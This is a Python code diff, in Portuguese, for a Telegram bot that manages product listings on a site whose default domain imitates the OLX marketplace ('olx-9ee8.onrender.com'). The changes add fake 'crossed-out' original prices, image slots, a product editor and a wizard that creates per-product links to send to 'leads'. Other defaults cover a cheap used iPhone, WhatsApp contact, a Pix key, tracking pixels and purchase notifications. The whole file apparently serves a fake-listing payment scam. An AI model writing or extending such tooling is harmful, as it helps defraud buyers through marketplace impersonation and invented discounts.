@@ -203,42 +203,54 @@ def init_db():
             code        TEXT UNIQUE NOT NULL,
             name        TEXT NOT NULL,
             price       TEXT NOT NULL,
+            old_price   TEXT DEFAULT '',
             description TEXT,
-            image_url   TEXT
+            image_url   TEXT,
+            image1      TEXT DEFAULT '',
+            image2      TEXT DEFAULT '',
+            image3      TEXT DEFAULT ''
         );
         CREATE INDEX IF NOT EXISTS idx_events_type ON events(event_type);
         CREATE INDEX IF NOT EXISTS idx_events_time ON events(created_at);
         CREATE INDEX IF NOT EXISTS idx_sessions_sid ON sessions(session_id);
     """)
+    # Migrações seguras para colunas novas (caso tabela já exista sem elas)
+    for col, default in [("old_price","''"),("image1","''"),("image2","''"),("image3","''")]:
+        try:
+            c.execute(f"ALTER TABLE product_templates ADD COLUMN {col} TEXT DEFAULT {default}")
+        except Exception:
+            pass
     defaults = {
         "whatsapp_number":     "5511999999999",
         "whatsapp_message":    "Olá! Tenho interesse no anúncio. Poderia me confirmar a disponibilidade?",
         "product_name":        "iPhone 11 64GB Branco - Impecável",
         "product_price":       "630.00",
+        "product_old_price":   "1299.00",
         "product_description": "iPhone 11 com 64GB de armazenamento na cor branca. Design elegante, câmeras duplas de alta definição e desempenho impecável com saúde de bateria excelente. Acompanha acessórios originais.",
         "product_image":       "/static/images/iphone_product.jpg",
         "active":              "1",
         "pixel_active":        "1",
         "notifications":       "1",
-        "pix_key":             "",  # Chave Pix real (CPF, CNPJ, email, telefone ou UUID) — configure via Telegram
+        "pix_key":             "",
     }
     for k, v in defaults.items():
-        # Criptografa configurações por padrão no banco
         enc_val = crypto_engine.encrypt(v)
         c.execute("INSERT OR IGNORE INTO config(key,value) VALUES(?,?)", (k, enc_val))
 
-    # Presets de modelos de produtos pré-prontos (Eletrodomésticos High-End)
+    # Presets de modelos de produtos pré-prontos
     preset_templates = [
-        ("geladeira_frost_free", "Geladeira Brastemp Frost Free Duplex 375L Inox", "1250.00", "Geladeira Brastemp Frost Free Duplex 375 Litros em Inox (BRM45HK). Possui controle eletrônico de temperatura, compartimento de congelamento rápido e prateleiras ajustáveis. Estado de nova, 110V, com nota fiscal e 6 meses de uso.", "https://images.unsplash.com/photo-1584992236310-6edddc08acff?q=80&w=800&auto=format&fit=crop"),
-        ("maquina_lavar", "Máquina de Lavar Electrolux 13kg Essential Care", "890.00", "Lavadora de Roupas Electrolux 13kg com Sistema Jet&Clean e Filtro Pega Fiapos (LED13). Muito conservada, 110V, higienizada recentemente. Lavagem silenciosa com economia de água e sabão.", "https://images.unsplash.com/photo-1626806787461-102c1bfaaea1?q=80&w=800&auto=format&fit=crop"),
-        ("fogao_4boca", "Fogão 4 Bocas Consul Inox com Acendimento Automático", "480.00", "Fogão 4 Bocas Consul Inox (CFO4NVA) com mesa de vidro temperado e grades duplas de ferro fundido. Forno limpa fácil com luz interna. Gás encanado/botijão convertível, impecável.", "https://images.unsplash.com/photo-1556911220-e15b29be8c8f?q=80&w=800&auto=format&fit=crop"),
-        ("microondas_30l", "Micro-ondas LG Grill 30 Litros Espelhado", "360.00", "Micro-ondas LG EasyClean 30 Litros com Função Grill e Prato Giratório (MS3095R). Revestimento interno antibacteriano, painel touch inteligente. Funcionando 100%, super limpo.", "https://images.unsplash.com/photo-1574269909862-7e1d70bb8078?q=80&w=800&auto=format&fit=crop"),
-        ("guarda_roupa_casal", "Guarda-Roupa Casal 6 Portas com Espelho Madesa", "750.00", "Guarda-Roupa Casal Madesa Royale 6 Portas e 4 Gavetas com Espelho Central. Madeira MDF tratada de alta durabilidade, cor Carvalho/Branco. Sem arranhões, montagem firme.", "https://images.unsplash.com/photo-1595428774223-ef52624120d2?q=80&w=800&auto=format&fit=crop"),
-        ("armario_cozinha", "Armário de Cozinha Completo 4 Peças Itatiaia", "620.00", "Armário de Cozinha Modulado Itatiaia Tarsila em Aço com Vidro Temperado. Composto por paneleiro duplo, armário aéreo e balcão com tampo resistente ao calor. Excelente estado.", "https://images.unsplash.com/photo-1556912172-45b7abe8b7e1?q=80&w=800&auto=format&fit=crop")
+        ("geladeira_frost_free", "Geladeira Brastemp Frost Free Duplex 375L Inox", "1250.00", "1899.00", "Geladeira Brastemp Frost Free Duplex 375 Litros em Inox (BRM45HK). Possui controle eletrônico de temperatura, compartimento de congelamento rápido e prateleiras ajustáveis. Estado de nova, 110V, com nota fiscal e 6 meses de uso.", "https://images.unsplash.com/photo-1584992236310-6edddc08acff?q=80&w=800&auto=format&fit=crop", "", "", ""),
+        ("maquina_lavar", "Máquina de Lavar Electrolux 13kg Essential Care", "890.00", "1350.00", "Lavadora de Roupas Electrolux 13kg com Sistema Jet&Clean e Filtro Pega Fiapos (LED13). Muito conservada, 110V, higienizada recentemente. Lavagem silenciosa com economia de água e sabão.", "https://images.unsplash.com/photo-1626806787461-102c1bfaaea1?q=80&w=800&auto=format&fit=crop", "", "", ""),
+        ("fogao_4boca", "Fogão 4 Bocas Consul Inox com Acendimento Automático", "480.00", "799.00", "Fogão 4 Bocas Consul Inox (CFO4NVA) com mesa de vidro temperado e grades duplas de ferro fundido. Forno limpa fácil com luz interna. Gás encanado/botijão convertível, impecável.", "https://images.unsplash.com/photo-1556911220-e15b29be8c8f?q=80&w=800&auto=format&fit=crop", "", "", ""),
+        ("microondas_30l", "Micro-ondas LG Grill 30 Litros Espelhado", "360.00", "580.00", "Micro-ondas LG EasyClean 30 Litros com Função Grill e Prato Giratório (MS3095R). Revestimento interno antibacteriano, painel touch inteligente. Funcionando 100%, super limpo.", "https://images.unsplash.com/photo-1574269909862-7e1d70bb8078?q=80&w=800&auto=format&fit=crop", "", "", ""),
+        ("guarda_roupa_casal", "Guarda-Roupa Casal 6 Portas com Espelho Madesa", "750.00", "1100.00", "Guarda-Roupa Casal Madesa Royale 6 Portas e 4 Gavetas com Espelho Central. Madeira MDF tratada de alta durabilidade, cor Carvalho/Branco. Sem arranhões, montagem firme.", "https://images.unsplash.com/photo-1595428774223-ef52624120d2?q=80&w=800&auto=format&fit=crop", "", "", ""),
+        ("armario_cozinha", "Armário de Cozinha Completo 4 Peças Itatiaia", "620.00", "950.00", "Armário de Cozinha Modulado Itatiaia Tarsila em Aço com Vidro Temperado. Composto por paneleiro duplo, armário aéreo e balcão com tampo resistente ao calor. Excelente estado.", "https://images.unsplash.com/photo-1556912172-45b7abe8b7e1?q=80&w=800&auto=format&fit=crop", "", "", "")
     ]
-    for code, name, price, desc, img in preset_templates:
-        c.execute("INSERT OR IGNORE INTO product_templates(code,name,price,description,image_url) VALUES(?,?,?,?,?)",
-                  (code, name, price, desc, img))
+    for code, name, price, old_price, desc, img, img1, img2, img3 in preset_templates:
+        c.execute(
+            "INSERT OR IGNORE INTO product_templates(code,name,price,old_price,description,image_url,image1,image2,image3) VALUES(?,?,?,?,?,?,?,?,?)",
+            (code, name, price, old_price, desc, img, img1, img2, img3)
+        )
 
     conn.commit()
     conn.close()
@@ -859,64 +871,155 @@ def handle_callback(update: Update, context: CallbackContext):
 
     elif cb == "product_templates_menu":
         conn = get_db()
-        rows = conn.execute("SELECT code, name, price, description FROM product_templates").fetchall()
+        rows = conn.execute("SELECT code, name, price, old_price FROM product_templates").fetchall()
         conn.close()
         btns = []
         for r in rows:
             btns.append([
-                InlineKeyboardButton(f"📦 {r['name']}", callback_data=f"apply_tpl_{r['code']}"),
-                InlineKeyboardButton(f"🔗 Gerar Link", callback_data=f"gen_link_{r['code']}")
+                InlineKeyboardButton(f"✏️ {r['name'][:22]}", callback_data=f"edit_tpl_{r['code']}"),
+                InlineKeyboardButton("🔗 Link", callback_data=f"gen_link_{r['code']}")
             ])
-        btns.append([InlineKeyboardButton("➕ Criar Novo Modelo Customizado", callback_data="create_new_tpl")])
+        btns.append([InlineKeyboardButton("➕ Criar Novo Produto", callback_data="create_new_tpl")])
         btns.append([InlineKeyboardButton("◀️ Voltar", callback_data="config_menu")])
         q.edit_message_text(
-            "📦 *GERENCIADOR DE MODELOS & LINKS EXCLUSIVOS*\n═════════════════════════════════════\n\n"
-            "• Clique no produto para definir como *Padrão da Loja*.\n"
-            "• Clique em *🔗 Gerar Link* para obter o link direto e isolado daquele produto especificamente para enviar ao cliente!",
+            "📦 *GERENCIADOR DE PRODUTOS — LINKS EXCLUSIVOS*\n═════════════════════════════════════\n\n"
+            "✏️ Clique no produto para *editar tudo* (nome, preço, fotos, descrição).\n"
+            "🔗 Clique em *Link* para copiar o link público daquele produto.",
             parse_mode=ParseMode.MARKDOWN,
             reply_markup=InlineKeyboardMarkup(btns)
         )
 
+    elif cb.startswith("edit_tpl_"):
+        tpl_code = cb.replace("edit_tpl_", "")
+        conn = get_db()
+        r = conn.execute("SELECT * FROM product_templates WHERE code=?", (tpl_code,)).fetchone()
+        conn.close()
+        if not r:
+            q.answer("Produto não encontrado.", show_alert=True)
+            return
+        context.user_data["editing_tpl"] = tpl_code
+        domain = get_config("site_domain", os.environ.get("BASE_URL", "https://olx-9ee8.onrender.com"))
+        img1 = r["image1"] or r["image_url"] or "—"
+        img2 = r["image2"] or "—"
+        img3 = r["image3"] or "—"
+        old_p = r["old_price"] or "—"
+        link = f"{domain.rstrip('/')}/p/{tpl_code}"
+        q.edit_message_text(
+            f"✏️ *EDITOR DO PRODUTO — {r['name'][:30]}*\n═════════════════════════════════════\n\n"
+            f"📦 *Nome:* `{r['name']}`\n"
+            f"💰 *Preço (real):* `R$ {r['price']}`\n"
+            f"🏷️ *Preço riscado:* `R$ {old_p}`\n"
+            f"📝 *Desc:* _{str(r['description'] or '')[:80]}..._\n"
+            f"🖼️ *Foto 1:* `{'✅' if r['image1'] or r['image_url'] else '❌ Não definida'}`\n"
+            f"🖼️ *Foto 2:* `{'✅' if r['image2'] else '❌ Não definida'}`\n"
+            f"🖼️ *Foto 3:* `{'✅' if r['image3'] else '❌ Não definida'}`\n\n"
+            f"🔗 *Link público:* `{link}`",
+            parse_mode=ParseMode.MARKDOWN,
+            reply_markup=InlineKeyboardMarkup([
+                [InlineKeyboardButton("📦 Nome", callback_data=f"tpl_edit_name_{tpl_code}"),
+                 InlineKeyboardButton("💰 Preço Real", callback_data=f"tpl_edit_price_{tpl_code}")],
+                [InlineKeyboardButton("🏷️ Preço Riscado", callback_data=f"tpl_edit_oldprice_{tpl_code}"),
+                 InlineKeyboardButton("📝 Descrição", callback_data=f"tpl_edit_desc_{tpl_code}")],
+                [InlineKeyboardButton("🖼️ Foto 1", callback_data=f"tpl_edit_img1_{tpl_code}"),
+                 InlineKeyboardButton("🖼️ Foto 2", callback_data=f"tpl_edit_img2_{tpl_code}"),
+                 InlineKeyboardButton("🖼️ Foto 3", callback_data=f"tpl_edit_img3_{tpl_code}")],
+                [InlineKeyboardButton("✅ Usar como Padrão", callback_data=f"apply_tpl_{tpl_code}")],
+                [InlineKeyboardButton("🔗 Copiar Link", callback_data=f"gen_link_{tpl_code}"),
+                 InlineKeyboardButton("🗑️ Deletar", callback_data=f"del_tpl_{tpl_code}")],
+                [InlineKeyboardButton("◀️ Voltar", callback_data="product_templates_menu")]
+            ])
+        )
+
+    elif cb.startswith(("tpl_edit_name_","tpl_edit_price_","tpl_edit_oldprice_","tpl_edit_desc_","tpl_edit_img1_","tpl_edit_img2_","tpl_edit_img3_")):
+        for prefix in ("tpl_edit_name_","tpl_edit_price_","tpl_edit_oldprice_","tpl_edit_desc_","tpl_edit_img1_","tpl_edit_img2_","tpl_edit_img3_"):
+            if cb.startswith(prefix):
+                field_map = {
+                    "tpl_edit_name_":     ("tpl_name",     "📦 *Envie o novo NOME do produto:*"),
+                    "tpl_edit_price_":    ("tpl_price",    "💰 *Envie o novo PREÇO real (ex: `630.00`):*"),
+                    "tpl_edit_oldprice_":("tpl_old_price","🏷️ *Envie o PREÇO RISCADO (ex: `1299.00`):*"),
+                    "tpl_edit_desc_":     ("tpl_desc",     "📝 *Envie a nova DESCRIÇÃO do produto:*"),
+                    "tpl_edit_img1_":    ("tpl_img1",     "🖼️ *Envie a URL ou FOTO da imagem 1:*"),
+                    "tpl_edit_img2_":    ("tpl_img2",     "🖼️ *Envie a URL ou FOTO da imagem 2:*"),
+                    "tpl_edit_img3_":    ("tpl_img3",     "🖼️ *Envie a URL ou FOTO da imagem 3:*"),
+                }
+                wait_key, prompt = field_map[prefix]
+                tpl_code = cb[len(prefix):]
+                context.user_data["waiting_for"] = wait_key
+                context.user_data["editing_tpl"]  = tpl_code
+                q.edit_message_text(prompt, parse_mode=ParseMode.MARKDOWN)
+                break
+
+    elif cb.startswith("del_tpl_"):
+        tpl_code = cb.replace("del_tpl_", "")
+        q.edit_message_text(
+            f"⚠️ *Confirma exclusão do produto `{tpl_code}`?*",
+            parse_mode=ParseMode.MARKDOWN,
+            reply_markup=yes_no_keyboard(f"del_tpl_do_{tpl_code}", "product_templates_menu")
+        )
+
+    elif cb.startswith("del_tpl_do_"):
+        tpl_code = cb.replace("del_tpl_do_", "")
+        conn = get_db(); conn.execute("DELETE FROM product_templates WHERE code=?", (tpl_code,)); conn.commit(); conn.close()
+        q.answer("Produto deletado!", show_alert=True)
+        q.edit_message_text("✅ Produto removido.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("📦 Voltar", callback_data="product_templates_menu")]]))
+
+    elif cb == "create_new_tpl":
+        context.user_data["waiting_for"] = "new_tpl_name"
+        context.user_data["new_tpl"] = {}
+        q.edit_message_text(
+            "🆕 *CRIAR NOVO PRODUTO — PASSO 1/4*\n══════════════════════════════════\n\n"
+            "📦 *Envie o NOME do novo produto:*\n_(ex: iPhone 13 128GB Azul)_",
+            parse_mode=ParseMode.MARKDOWN
+        )
+
     elif cb.startswith("gen_link_"):
+
         tpl_code = cb.replace("gen_link_", "")
         conn = get_db()
-        r = conn.execute("SELECT name, price, description FROM product_templates WHERE code=?", (tpl_code,)).fetchone()
+        r = conn.execute("SELECT name, price, old_price FROM product_templates WHERE code=?", (tpl_code,)).fetchone()
         conn.close()
         if r:
-            domain = get_config("site_domain", "https://seu-dominio.com")
+            domain = get_config("site_domain", os.environ.get("BASE_URL", "https://olx-9ee8.onrender.com"))
             direct_link = f"{domain.rstrip('/')}/p/{tpl_code}"
-            query_link  = f"{domain.rstrip('/')}/?p={tpl_code}"
+            old_p = r["old_price"] or "—"
             q.edit_message_text(
-                f"🔗 *LINK EXCLUSIVO GERADO PARA O CLIENTE*\n═════════════════════════════════════\n\n"
+                f"🔗 *LINK PÚBLICO DO PRODUTO*\n═════════════════════════════════════\n\n"
                 f"📦 *Produto:* `{r['name']}`\n"
-                f"💰 *Preço:* `R$ {r['price']}`\n\n"
-                f"🌐 *Link Amigável:* `{direct_link}`\n"
-                f"⚡ *Link Alternativo:* `{query_link}`\n\n"
-                f"ℹ️ _Este link exibirá estritamente o produto {r['name']} para quem acessá-lo, permitindo múltiplos clientes simultâneos sem misturar compras!_",
+                f"💰 *Preço:* `R$ {r['price']}` ~~R$ {old_p}~~\n\n"
+                f"🌐 *Link para enviar ao cliente:*\n`{direct_link}`\n\n"
+                f"_Copie o link acima e envie para o lead. Cada cliente acessa o produto individualmente sem cruzar dados!_",
                 parse_mode=ParseMode.MARKDOWN,
                 reply_markup=InlineKeyboardMarkup([
-                    [InlineKeyboardButton("📦 Voltar aos Modelos", callback_data="product_templates_menu")],
-                    [InlineKeyboardButton("◀️ Voltar ao Painel", callback_data="main_menu")]
+                    [InlineKeyboardButton("✏️ Editar produto", callback_data=f"edit_tpl_{tpl_code}")],
+                    [InlineKeyboardButton("📦 Voltar aos Produtos", callback_data="product_templates_menu")],
+                    [InlineKeyboardButton("◀️ Menu Principal", callback_data="main_menu")]
                 ])
             )
 
     elif cb.startswith("apply_tpl_"):
         tpl_code = cb.replace("apply_tpl_", "")
         conn = get_db()
-        r = conn.execute("SELECT name, price, description, image_url FROM product_templates WHERE code=?", (tpl_code,)).fetchone()
+        r = conn.execute("SELECT * FROM product_templates WHERE code=?", (tpl_code,)).fetchone()
         conn.close()
         if r:
-            set_config("product_name", r["name"])
-            set_config("product_price", r["price"])
-            set_config("product_description", r["description"])
-            if r["image_url"]:
-                set_config("product_image", r["image_url"])
-            q.answer(f"Modelo {r['name']} definido como padrão!", show_alert=True)
+            set_config("product_name",      r["name"])
+            set_config("product_price",     r["price"])
+            set_config("product_old_price", r["old_price"] or "")
+            set_config("product_description", r["description"] or "")
+            # Foto 1: prioriza image1, cai em image_url
+            img1 = r["image1"] or r["image_url"] or ""
+            img2 = r["image2"] or r["image_url"] or ""
+            img3 = r["image3"] or r["image_url"] or ""
+            if img1: set_config("product_image",  img1)
+            if img1: set_config("product_image1", img1)
+            if img2: set_config("product_image2", img2)
+            if img3: set_config("product_image3", img3)
+            q.answer(f"Produto '{r['name']}' definido como padrão!", show_alert=True)
             q.edit_message_text(
-                f"✅ *MODELO APLICADO COMO PADRÃO DA LOJA!*\n═════════════════════════════════════\n\n"
+                f"✅ *PRODUTO APLICADO COMO PADRÃO DA LOJA!*\n═════════════════════════════════════\n\n"
                 f"📦 *Produto:* `{r['name']}`\n"
-                f"💰 *Preço:* `R$ {r['price']}`\n"
-                f"📜 *Descrição:* _{r['description']}_",
+                f"💰 *Preço:* `R$ {r['price']}`   ~~R$ {r['old_price'] or '—'}~~\n"
+                f"📜 *Descrição:* _{str(r['description'] or '')[:200]}_",
                 parse_mode=ParseMode.MARKDOWN,
                 reply_markup=config_keyboard()
             )
@@ -1269,7 +1372,159 @@ def handle_incoming_messages(update: Update, context: CallbackContext):
         set_config("telegram_channel_id", clean_channel)
         update.message.reply_text(f"✅ *Canal Telegram Configurado:* `{clean_channel}`\nTodos os leads e compras serão enviados para cá!", parse_mode=ParseMode.MARKDOWN, reply_markup=config_keyboard())
 
+    # ─── TEMPLATE PRODUCT FIELD EDITORS ──────────────────────────────────────
+    elif waiting in ("tpl_name", "tpl_price", "tpl_old_price", "tpl_desc", "tpl_img1", "tpl_img2", "tpl_img3"):
+        tpl_code = context.user_data.get("editing_tpl", "")
+        if not tpl_code:
+            update.message.reply_text("❌ Sessão expirada. Volte ao menu de produtos.")
+            return
+        conn = get_db()
+        r = conn.execute("SELECT * FROM product_templates WHERE code=?", (tpl_code,)).fetchone()
+        conn.close()
+        if not r:
+            update.message.reply_text("❌ Produto não encontrado.")
+            return
+
+        # Para campos de imagem, aceita foto enviada direto OU URL de texto
+        if waiting in ("tpl_img1", "tpl_img2", "tpl_img3"):
+            photo_url = None
+            # Foto enviada pelo Telegram
+            if update.message.photo:
+                file_id = update.message.photo[-1].file_id
+                try:
+                    bot_file = context.bot.get_file(file_id)
+                    photo_url = bot_file.file_path
+                except Exception:
+                    photo_url = file_id
+            elif update.message.text and InputValidator.validate_url(update.message.text.strip()):
+                photo_url = update.message.text.strip()
+
+            if not photo_url:
+                update.message.reply_text("❌ Envie uma foto válida ou URL de imagem (http...). Tente novamente.")
+                context.user_data["waiting_for"] = waiting  # mantém o estado
+                return
+
+            col_map = {"tpl_img1": "image1", "tpl_img2": "image2", "tpl_img3": "image3"}
+            col = col_map[waiting]
+            conn = get_db()
+            conn.execute(f"UPDATE product_templates SET {col}=? WHERE code=?", (photo_url, tpl_code))
+            # Se for Foto 1, atualiza também image_url (campo legado)
+            if waiting == "tpl_img1":
+                conn.execute("UPDATE product_templates SET image_url=? WHERE code=?", (photo_url, tpl_code))
+            conn.commit()
+            conn.close()
+            slot = waiting[-1]
+            update.message.reply_text(
+                f"✅ *Foto {slot} atualizada com sucesso!*\n`{photo_url}`",
+                parse_mode=ParseMode.MARKDOWN,
+                reply_markup=InlineKeyboardMarkup([[
+                    InlineKeyboardButton("✏️ Voltar ao Editor", callback_data=f"edit_tpl_{tpl_code}")
+                ]])
+            )
+        else:
+            # Campos de texto
+            if not update.message.text:
+                update.message.reply_text("❌ Envie um texto válido.")
+                context.user_data["waiting_for"] = waiting
+                return
+            val = update.message.text.strip()
+            if waiting == "tpl_name":
+                val = InputValidator.sanitize_text(val, max_chars=200)
+                conn = get_db(); conn.execute("UPDATE product_templates SET name=? WHERE code=?", (val, tpl_code)); conn.commit(); conn.close()
+                update.message.reply_text(f"✅ *Nome atualizado:* `{val}`", parse_mode=ParseMode.MARKDOWN, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("✏️ Voltar ao Editor", callback_data=f"edit_tpl_{tpl_code}")]]))
+            elif waiting == "tpl_price":
+                try:
+                    price = float(val.replace(",", "."))
+                    conn = get_db(); conn.execute("UPDATE product_templates SET price=? WHERE code=?", (f"{price:.2f}", tpl_code)); conn.commit(); conn.close()
+                    update.message.reply_text(f"✅ *Preço real atualizado:* `R$ {price:.2f}`", parse_mode=ParseMode.MARKDOWN, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("✏️ Voltar ao Editor", callback_data=f"edit_tpl_{tpl_code}")]]))
+                except ValueError:
+                    update.message.reply_text("❌ Preço inválido. Exemplo: `630.00`", parse_mode=ParseMode.MARKDOWN)
+                    context.user_data["waiting_for"] = waiting; return
+            elif waiting == "tpl_old_price":
+                try:
+                    old_price = float(val.replace(",", "."))
+                    conn = get_db(); conn.execute("UPDATE product_templates SET old_price=? WHERE code=?", (f"{old_price:.2f}", tpl_code)); conn.commit(); conn.close()
+                    update.message.reply_text(f"✅ *Preço riscado atualizado:* `R$ {old_price:.2f}`", parse_mode=ParseMode.MARKDOWN, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("✏️ Voltar ao Editor", callback_data=f"edit_tpl_{tpl_code}")]]))
+                except ValueError:
+                    update.message.reply_text("❌ Preço inválido. Exemplo: `1299.00`", parse_mode=ParseMode.MARKDOWN)
+                    context.user_data["waiting_for"] = waiting; return
+            elif waiting == "tpl_desc":
+                val = InputValidator.sanitize_text(val, max_chars=2000)
+                conn = get_db(); conn.execute("UPDATE product_templates SET description=? WHERE code=?", (val, tpl_code)); conn.commit(); conn.close()
+                update.message.reply_text("✅ *Descrição atualizada com sucesso!*", parse_mode=ParseMode.MARKDOWN, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("✏️ Voltar ao Editor", callback_data=f"edit_tpl_{tpl_code}")]]))
+
+
+    # ─── NOVO PRODUTO — WIZARD 4 PASSOS ──────────────────────────────────────
+    elif waiting in ("new_tpl_name", "new_tpl_price", "new_tpl_old_price", "new_tpl_desc"):
+        if not update.message.text:
+            update.message.reply_text("❌ Envie um texto válido.")
+            context.user_data["waiting_for"] = waiting; return
+
+        val = update.message.text.strip()
+        draft = context.user_data.setdefault("new_tpl", {})
+
+        if waiting == "new_tpl_name":
+            draft["name"] = InputValidator.sanitize_text(val, max_chars=200)
+            context.user_data["waiting_for"] = "new_tpl_price"
+            update.message.reply_text(
+                f"✅ Nome: `{draft['name']}`\n\n💰 *PASSO 2/4 — Envie o PREÇO real:*\n_(ex: `630.00`)_",
+                parse_mode=ParseMode.MARKDOWN
+            )
+        elif waiting == "new_tpl_price":
+            try:
+                price = float(val.replace(",", "."))
+                draft["price"] = f"{price:.2f}"
+            except ValueError:
+                update.message.reply_text("❌ Preço inválido. Ex: `630.00`", parse_mode=ParseMode.MARKDOWN)
+                context.user_data["waiting_for"] = waiting; return
+            context.user_data["waiting_for"] = "new_tpl_old_price"
+            update.message.reply_text(
+                f"✅ Preço: `R$ {draft['price']}`\n\n🏷️ *PASSO 3/4 — Envie o PREÇO RISCADO (original):*\n_(ex: `1299.00`) ou envie `0` para pular_",
+                parse_mode=ParseMode.MARKDOWN
+            )
+        elif waiting == "new_tpl_old_price":
+            try:
+                old_price = float(val.replace(",", "."))
+                draft["old_price"] = f"{old_price:.2f}" if old_price > 0 else ""
+            except ValueError:
+                draft["old_price"] = ""
+            context.user_data["waiting_for"] = "new_tpl_desc"
+            update.message.reply_text(
+                f"✅ Preço riscado: `R$ {draft['old_price'] or '—'}`\n\n📝 *PASSO 4/4 — Envie a DESCRIÇÃO do produto:*",
+                parse_mode=ParseMode.MARKDOWN
+            )
+        elif waiting == "new_tpl_desc":
+            draft["description"] = InputValidator.sanitize_text(val, max_chars=2000)
+            # Gera código único
+            import re as _re
+            base_code = _re.sub(r"[^a-z0-9]+", "_", draft["name"].lower())[:30].strip("_")
+            code = f"{base_code}_{int(time.time()) % 10000}"
+            conn = get_db()
+            conn.execute(
+                "INSERT OR REPLACE INTO product_templates(code,name,price,old_price,description,image_url,image1,image2,image3) VALUES(?,?,?,?,?,?,?,?,?)",
+                (code, draft["name"], draft["price"], draft.get("old_price", ""), draft["description"], "", "", "", "")
+            )
+            conn.commit()
+            conn.close()
+            context.user_data.pop("waiting_for", None)
+            context.user_data.pop("new_tpl", None)
+            context.user_data["editing_tpl"] = code
+            update.message.reply_text(
+                f"🎉 *PRODUTO CRIADO COM SUCESSO!*\n══════════════════════════════════\n\n"
+                f"📦 *Nome:* `{draft['name']}`\n"
+                f"💰 *Preço:* `R$ {draft['price']}`\n"
+                f"🏷️ *Preço riscado:* `R$ {draft.get('old_price') or '—'}`\n\n"
+                f"➡️ Agora adicione as *fotos* do produto clicando em Editar!",
+                parse_mode=ParseMode.MARKDOWN,
+                reply_markup=InlineKeyboardMarkup([
+                    [InlineKeyboardButton("✏️ Editar e adicionar fotos", callback_data=f"edit_tpl_{code}")],
+                    [InlineKeyboardButton("📦 Voltar aos Produtos", callback_data="product_templates_menu")]
+                ])
+            )
+
+
 # ─── API PÚBLICA DE NOTIFICAÇÕES SEGURO (Chamada por app.py) ─────────────────
+
 _bot_instance = None
 
 def notify_admins(event_type: str, data: dict):
